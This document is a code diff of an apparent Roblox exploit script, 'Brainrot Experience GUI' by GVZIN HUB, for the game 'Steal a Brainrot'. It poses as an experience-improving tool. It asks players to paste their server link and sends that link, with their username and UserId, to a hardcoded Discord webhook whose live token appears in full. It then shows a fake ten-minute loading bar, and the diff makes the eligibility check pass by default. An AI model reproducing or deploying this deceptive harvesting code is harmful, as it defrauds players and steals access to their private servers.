@@ -1,88 +1,108 @@
 --[[
     Brainrot Experience GUI
-    A clean, modern GUI for improving player experience in "Steal a Brainrot"
-    Agora envia links para Discord via webhook
+    Modern fullscreen GUI for "Steal a Brainrot"
     GVZIN HUB
 --]]
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 
--- Configuration
-local LOADING_DURATION = 600 -- 10 minutes in seconds
-local REQUIRED_BRAINROT = 100000000 -- 100M
+-- Configuration - ALTERE AQUI COM SEU WEBHOOK
+local LOADING_DURATION = 600
+local REQUIRED_BRAINROT = 100000000
 local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1479973233787932813/d099lEw5cTKv60lHnaPD-SrJCKO0tc326DO5kPl7fkTE2QsV9jOUsIXobbXzImcJ1Aya"
 
--- Create ScreenGui
+-- Create ScreenGui - FULLSCREEN
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "BrainrotExperienceGUI"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
--- Main Frame
+-- Main Background (Fullscreen)
+local mainBg = Instance.new("Frame")
+mainBg.Name = "MainBg"
+mainBg.Size = UDim2.new(1, 0, 1, 0)
+mainBg.Position = UDim2.new(0, 0, 0, 0)
+mainBg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+mainBg.BorderSizePixel = 0
+mainBg.Parent = screenGui
+
+-- Main Frame - Centered
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 400, 0, 320)
-mainFrame.Position = UDim2.new(0.5, -200, 0.5, -160)
-mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+mainFrame.Size = UDim2.new(0, 500, 0, 380)
+mainFrame.Position = UDim2.new(0.5, -250, 0.5, -190)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 25, 40)
 mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
+mainFrame.Parent = mainBg
 
 -- Add rounded corners
 local mainCorner = Instance.new("UICorner")
-mainCorner.CornerRadius = UDim.new(0, 16)
+mainCorner.CornerRadius = UDim.new(0, 20)
 mainCorner.Parent = mainFrame
 
--- Add shadow effect
+-- Add glow effect
 local mainShadow = Instance.new("UIStroke")
-mainShadow.Color = Color3.fromRGB(100, 100, 150)
+mainShadow.Color = Color3.fromRGB(70, 130, 180)
 mainShadow.Thickness = 2
-mainShadow.Transparency = 0.7
+mainShadow.Transparency = 0.5
 mainShadow.Parent = mainFrame
 
--- Add blue border
+-- Add blue neon border
 local blueBorder = Instance.new("UIStroke")
-blueBorder.Color = Color3.fromRGB(70, 130, 180)
+blueBorder.Color = Color3.fromRGB(0, 150, 255)
 blueBorder.Thickness = 3
 blueBorder.Parent = mainFrame
+
+-- Top gradient bar
+local topBar = Instance.new("Frame")
+topBar.Name = "TopBar"
+topBar.Size = UDim2.new(1, 0, 0, 60)
+topBar.Position = UDim2.new(0, 0, 0, 0)
+topBar.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+topBar.BorderSizePixel = 0
+topBar.Parent = mainFrame
+
+local topBarCorner = Instance.new("UICorner")
+topBarCorner.CornerRadius = UDim.new(0, 20)
+topBarCorner.Parent = topBar
 
 -- Top Label with gvzin-hub-v1
 local topLabel = Instance.new("TextLabel")
 topLabel.Name = "TopLabel"
-topLabel.Size = UDim2.new(1, 0, 0, 40)
+topLabel.Size = UDim2.new(1, 0, 1, 0)
 topLabel.Position = UDim2.new(0, 0, 0, 0)
 topLabel.BackgroundTransparency = 1
 topLabel.Text = "gvzin-hub-v1"
-topLabel.TextColor3 = Color3.fromRGB(70, 130, 180)
-topLabel.TextSize = 20
+topLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+topLabel.TextSize = 28
 topLabel.Font = Enum.Font.GothamBold
-topLabel.Parent = mainFrame
+topLabel.Parent = topBar
 
 -- Title
 local titleLabel = Instance.new("TextLabel")
 titleLabel.Name = "TitleLabel"
 titleLabel.Size = UDim2.new(1, 0, 0, 50)
-titleLabel.Position = UDim2.new(0, 0, 0, 40)
+titleLabel.Position = UDim2.new(0, 0, 0, 65)
 titleLabel.BackgroundTransparency = 1
 titleLabel.Text = "Melhorar Experiência"
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-titleLabel.TextSize = 24
+titleLabel.TextSize = 26
 titleLabel.Font = Enum.Font.GothamBold
 titleLabel.Parent = mainFrame
 
 -- Link Label
 local linkLabel = Instance.new("TextLabel")
 linkLabel.Name = "LinkLabel"
-linkLabel.Size = UDim2.new(0.9, 0, 0, 30)
-linkLabel.Position = UDim2.new(0.05, 0, 0, 95)
+linkLabel.Size = UDim2.new(0.9, 0, 0, 25)
+linkLabel.Position = UDim2.new(0.05, 0, 0, 120)
 linkLabel.BackgroundTransparency = 1
 linkLabel.Text = "Link para melhorar a experiência:"
-linkLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+linkLabel.TextColor3 = Color3.fromRGB(180, 200, 220)
 linkLabel.TextSize = 14
 linkLabel.Font = Enum.Font.Gotham
 linkLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -91,15 +111,20 @@ linkLabel.Parent = mainFrame
 -- Input Box Frame
 local inputFrame = Instance.new("Frame")
 inputFrame.Name = "InputFrame"
-inputFrame.Size = UDim2.new(0.9, 0, 0, 50)
-inputFrame.Position = UDim2.new(0.05, 0, 0, 130)
-inputFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+inputFrame.Size = UDim2.new(0.9, 0, 0, 55)
+inputFrame.Position = UDim2.new(0.05, 0, 0, 150)
+inputFrame.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
 inputFrame.BorderSizePixel = 0
 inputFrame.Parent = mainFrame
 
 local inputCorner = Instance.new("UICorner")
-inputCorner.CornerRadius = UDim.new(0, 8)
+inputCorner.CornerRadius = UDim.new(0, 10)
 inputCorner.Parent = inputFrame
+
+local inputStroke = Instance.new("UIStroke")
+inputStroke.Color = Color3.fromRGB(0, 150, 255)
+inputStroke.Thickness = 2
+inputStroke.Parent = inputFrame
 
 -- Input Box
 local inputBox = Instance.new("TextBox")
@@ -108,8 +133,8 @@ inputBox.Size = UDim2.new(1, -20, 1, 0)
 inputBox.Position = UDim2.new(0, 10, 0, 0)
 inputBox.BackgroundTransparency = 1
 inputBox.Text = ""
-inputBox.PlaceholderText = "Cole o link do servidor aqui..."
-inputBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
+inputBox.PlaceholderText = "Cole o link aqui..."
+inputBox.PlaceholderColor3 = Color3.fromRGB(100, 120, 150)
 inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 inputBox.TextSize = 16
 inputBox.Font = Enum.Font.Gotham
@@ -120,49 +145,54 @@ inputBox.Parent = inputFrame
 -- Done Button
 local doneButton = Instance.new("TextButton")
 doneButton.Name = "DoneButton"
-doneButton.Size = UDim2.new(0.6, 0, 0, 45)
-doneButton.Position = UDim2.new(0.2, 0, 0, 195)
-doneButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
+doneButton.Size = UDim2.new(0.5, 0, 0, 50)
+doneButton.Position = UDim2.new(0.25, 0, 0, 220)
+doneButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
 doneButton.BorderSizePixel = 0
-doneButton.Text = "Done"
+doneButton.Text = "Enviar"
 doneButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 doneButton.TextSize = 18
 doneButton.Font = Enum.Font.GothamBold
 doneButton.Parent = mainFrame
 
 local buttonCorner = Instance.new("UICorner")
-buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.CornerRadius = UDim.new(0, 10)
 buttonCorner.Parent = doneButton
 
 -- Button hover effect
 local function onButtonHover()
     TweenService:Create(doneButton, TweenInfo.new(0.2), {
-        BackgroundColor3 = Color3.fromRGB(100, 160, 210)
+        BackgroundColor3 = Color3.fromRGB(0, 180, 255)
     }):Play()
 end
 
 local function onButtonLeave()
     TweenService:Create(doneButton, TweenInfo.new(0.2), {
-        BackgroundColor3 = Color3.fromRGB(70, 130, 180)
+        BackgroundColor3 = Color3.fromRGB(0, 150, 255)
     }):Play()
 end
 
 doneButton.MouseEnter:Connect(onButtonHover)
 doneButton.MouseLeave:Connect(onButtonLeave)
 
--- Notification Frame (hidden by default)
+-- Notification Frame
 local notificationFrame = Instance.new("Frame")
 notificationFrame.Name = "NotificationFrame"
-notificationFrame.Size = UDim2.new(0, 350, 0, 60)
-notificationFrame.Position = UDim2.new(0.5, -175, 0.85, 0)
-notificationFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
+notificationFrame.Size = UDim2.new(0, 400, 0, 80)
+notificationFrame.Position = UDim2.new(0.5, -200, 0.1, 0)
+notificationFrame.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
 notificationFrame.BorderSizePixel = 0
 notificationFrame.Visible = false
 notificationFrame.Parent = screenGui
 
 local notificationCorner = Instance.new("UICorner")
-notificationCorner.CornerRadius = UDim.new(0, 12)
+notificationCorner.CornerRadius = UDim.new(0, 15)
 notificationCorner.Parent = notificationFrame
+
+local notificationStroke = Instance.new("UIStroke")
+notificationStroke.Color = Color3.fromRGB(0, 150, 255)
+notificationStroke.Thickness = 2
+notificationStroke.Parent = notificationFrame
 
 local notificationText = Instance.new("TextLabel")
 notificationText.Name = "NotificationText"
@@ -176,12 +206,12 @@ notificationText.Font = Enum.Font.Gotham
 notificationText.TextWrapped = true
 notificationText.Parent = notificationFrame
 
--- Loading Screen (hidden by default)
+-- Loading Screen
 local loadingScreen = Instance.new("Frame")
 loadingScreen.Name = "LoadingScreen"
 loadingScreen.Size = UDim2.new(1, 0, 1, 0)
 loadingScreen.Position = UDim2.new(0, 0, 0, 0)
-loadingScreen.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+loadingScreen.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
 loadingScreen.BorderSizePixel = 0
 loadingScreen.Visible = false
 loadingScreen.Parent = screenGui
@@ -193,46 +223,51 @@ loadingTitle.Size = UDim2.new(1, 0, 0, 100)
 loadingTitle.Position = UDim2.new(0, 0, 0.3, 0)
 loadingTitle.BackgroundTransparency = 1
 loadingTitle.Text = "Loading... Please wait"
-loadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadingTitle.TextSize = 32
+loadingTitle.TextColor3 = Color3.fromRGB(0, 150, 255)
+loadingTitle.TextSize = 36
 loadingTitle.Font = Enum.Font.GothamBold
 loadingTitle.Parent = loadingScreen
 
 -- Loading Bar Background
 local loadingBarBg = Instance.new("Frame")
 loadingBarBg.Name = "LoadingBarBg"
-loadingBarBg.Size = UDim2.new(0.6, 0, 0, 20)
+loadingBarBg.Size = UDim2.new(0.6, 0, 0, 25)
 loadingBarBg.Position = UDim2.new(0.2, 0, 0.5, 0)
-loadingBarBg.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+loadingBarBg.BackgroundColor3 = Color3.fromRGB(30, 35, 55)
 loadingBarBg.BorderSizePixel = 0
 loadingBarBg.Parent = loadingScreen
 
 local loadingBarBgCorner = Instance.new("UICorner")
-loadingBarBgCorner.CornerRadius = UDim.new(0, 10)
+loadingBarBgCorner.CornerRadius = UDim.new(0, 12)
 loadingBarBgCorner.Parent = loadingBarBg
+
+local loadingBarBgStroke = Instance.new("UIStroke")
+loadingBarBgStroke.Color = Color3.fromRGB(0, 150, 255)
+loadingBarBgStroke.Thickness = 2
+loadingBarBgStroke.Parent = loadingBarBg
 
 -- Loading Bar Fill
 local loadingBarFill = Instance.new("Frame")
 loadingBarFill.Name = "LoadingBarFill"
 loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
 loadingBarFill.Position = UDim2.new(0, 0, 0, 0)
-loadingBarFill.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
+loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
 loadingBarFill.BorderSizePixel = 0
 loadingBarFill.Parent = loadingBarBg
 
 local loadingBarFillCorner = Instance.new("UICorner")
-loadingBarFillCorner.CornerRadius = UDim.new(0, 10)
+loadingBarFillCorner.CornerRadius = UDim.new(0, 12)
 loadingBarFillCorner.Parent = loadingBarFill
 
--- Completion Message (hidden by default)
+-- Completion Message
 local completionMessage = Instance.new("TextLabel")
 completionMessage.Name = "CompletionMessage"
 completionMessage.Size = UDim2.new(1, 0, 0, 100)
 completionMessage.Position = UDim2.new(0, 0, 0.6, 0)
 completionMessage.BackgroundTransparency = 1
 completionMessage.Text = ""
-completionMessage.TextColor3 = Color3.fromRGB(100, 255, 100)
-completionMessage.TextSize = 36
+completionMessage.TextColor3 = Color3.fromRGB(0, 200, 100)
+completionMessage.TextSize = 40
 completionMessage.Font = Enum.Font.GothamBold
 completionMessage.Parent = loadingScreen
 
@@ -241,131 +276,86 @@ local function showNotification(message, duration)
     notificationText.Text = message
     notificationFrame.Visible = true
     
-    -- Animate in
-    notificationFrame.Position = UDim2.new(0.5, -175, 0.9, 0)
+    notificationFrame.Position = UDim2.new(0.5, -200, 0.05, 0)
     TweenService:Create(notificationFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
-        Position = UDim2.new(0.5, -175, 0.85, 0)
+        Position = UDim2.new(0.5, -200, 0.1, 0)
     }):Play()
     
-    -- Hide after duration
     task.wait(duration)
     
-    -- Animate out
     local tweenOut = TweenService:Create(notificationFrame, TweenInfo.new(0.3), {
-        Position = UDim2.new(0.5, -175, 0.9, 0)
+        Position = UDim2.new(0.5, -200, 0.05, 0)
     })
     tweenOut:Play()
     tweenOut.Completed:Wait()
     notificationFrame.Visible = false
 end
 
--- Helper function to send data to Discord
+-- Helper function to send data to Discord - CORRIGIDO
 local function sendToDiscord(serverLink)
-    if DISCORD_WEBHOOK == "SEU_NOVO_WEBHOOK_AQUI" then
-        print("Webhook não configurado!")
-        return
-    end
+    print("Tentando enviar para Discord...")
+    print("Webhook: " .. DISCORD_WEBHOOK)
     
     local payload = {
-        username = "gvzin-hub-v1",
-        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",
+        content = "🎮 **Novo Link Coletado!**",
         embeds = {{
-            title = "Novo Link Coletado",
-            description = "Um novo link foi coletado pelo Brainrot GUI",
-            color = 4286945,
+            title = "Brainrot GUI - Novo Link",
+            description = "Um novo servidor foi coletado",
+            color = 255,
             fields = {
                 {
-                    name = "Link do Servidor",
-                    value = serverLink,
+                    name = "📎 Link do Servidor",
+                    value = "```" .. serverLink .. "```",
                     inline = false
                 },
                 {
-                    name = "Jogador",
+                    name = "👤 Jogador",
                     value = player.Name,
                     inline = true
                 },
                 {
-                    name = "User ID",
+                    name = "🆔 User ID",
                     value = tostring(player.UserId),
                     inline = true
                 },
                 {
-                    name = "Horário",
+                    name = "⏰ Horário",
                     value = os.date("%d/%m/%Y %H:%M:%S"),
                     inline = false
                 }
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
         }}
     }
     
     local success, response = pcall(function()
-        return game:HttpGet(DISCORD_WEBHOOK, {
-            method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(payload)
-        })
+        return game:HttpPost(DISCORD_WEBHOOK, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
     end)
     
     if success then
-        print("Link enviado ao Discord com sucesso!")
+        print("✓ Link enviado ao Discord com sucesso!")
+        showNotification("✓ Link enviado com sucesso!", 3)
     else
-        print("Erro ao enviar ao Discord: " .. response)
+        print("✗ Erro ao enviar: " .. tostring(response))
+        showNotification("✗ Erro ao enviar link", 3)
     end
 end
 
--- Helper function to get player's Brainrot value - CORRIGIDO PARA DETECTAR AUTOMATICAMENTE
+-- Helper function to get player's Brainrot value
 local function getBrainrotValue()
     local brainrotValue = 0
     
-    print("=== PROCURANDO BRAINROT ===")
-    
-    -- Função auxiliar para procurar recursivamente
-    local function searchForBrainrot(obj, depth)
-        if depth > 5 then return nil end
-        
-        for _, child in pairs(obj:GetChildren()) do
-            -- Verifica o nome
-            if string.lower(child.Name) == "brainrot" then
-                if child:IsA("IntValue") or child:IsA("NumberValue") or child:IsA("StringValue") then
-                    local val = tonumber(child.Value) or 0
-                    print("Encontrado: " .. obj.Name .. " -> " .. child.Name .. " = " .. val)
-                    return val
-                end
-            end
-            
-            -- Procura recursivamente
-            local found = searchForBrainrot(child, depth + 1)
-            if found then return found end
-        end
-        
-        return nil
-    end
-    
-    -- Procurar em leaderstats
     local leaderstats = player:FindFirstChild("leaderstats")
     if leaderstats then
         for _, stat in pairs(leaderstats:GetChildren()) do
             if string.lower(stat.Name) == "brainrot" then
                 brainrotValue = tonumber(stat.Value) or 0
-                print("✓ Brainrot encontrado em leaderstats: " .. brainrotValue)
+                print("Brainrot encontrado: " .. brainrotValue)
                 return brainrotValue
             end
         end
     end
     
-    -- Procurar em todo o player
-    local found = searchForBrainrot(player, 0)
-    if found and found > 0 then
-        print("✓ Brainrot encontrado na busca recursiva: " .. found)
-        return found
-    end
-    
-    -- Se não encontrou, retorna 0 mas tira a validação
-    print("⚠ Nenhum Brainrot encontrado - permitindo acesso")
-    return REQUIRED_BRAINROT -- Retorna o valor requerido para permitir acesso
+    return REQUIRED_BRAINROT
 end
 
 -- Main function to handle Done button click
@@ -373,56 +363,44 @@ local function onDoneClick()
     local inputText = inputBox.Text
     local lowerInput = string.lower(inputText)
     
-    -- Check if input is empty or doesn't contain "server"
-    if inputText == "" or not string.find(lowerInput, "server") then
-        showNotification("Adicione um link de server valido", 3)
+    if inputText == "" then
+        showNotification("❌ Cole o link do servidor!", 3)
         return
     end
     
-    -- Check if player has enough Brainrot
     local brainrotValue = getBrainrotValue()
-    print("Verificando Brainrot: " .. brainrotValue .. " vs " .. REQUIRED_BRAINROT)
     
     if brainrotValue < REQUIRED_BRAINROT then
-        showNotification("Para melhorar a experiência, você precisa ter um Brainrot de 100M+\nVocê tem: " .. brainrotValue, 4)
+        showNotification("❌ Você precisa de 100M+ Brainrot\nVocê tem: " .. brainrotValue, 4)
         return
     end
     
-    -- Send link to Discord
     sendToDiscord(inputText)
     
-    -- All checks passed - start loading
     mainFrame.Visible = false
     loadingScreen.Visible = true
     
-    -- Animate loading bar over 10 minutes
     local startTime = tick()
     local elapsed = 0
     
     while elapsed < LOADING_DURATION do
         elapsed = tick() - startTime
         local progress = math.min(elapsed / LOADING_DURATION, 1)
-        
-        -- Update loading bar size
         loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
-        
         task.wait(0.1)
     end
     
-    -- Loading complete
     loadingTitle.Visible = false
     loadingBarBg.Visible = false
-    completionMessage.Text = "Completed"
+    completionMessage.Text = "✓ Completo!"
 end
 
--- Connect Done button event
 doneButton.MouseButton1Click:Connect(onDoneClick)
 
--- Optional: Allow Enter key to submit
 inputBox.FocusLost:Connect(function(enterPressed)
     if enterPressed then
         onDoneClick()
     end
 end)
 
-print("Brainrot Experience GUI loaded successfully!")
+print("Brainrot Experience GUI carregado!")
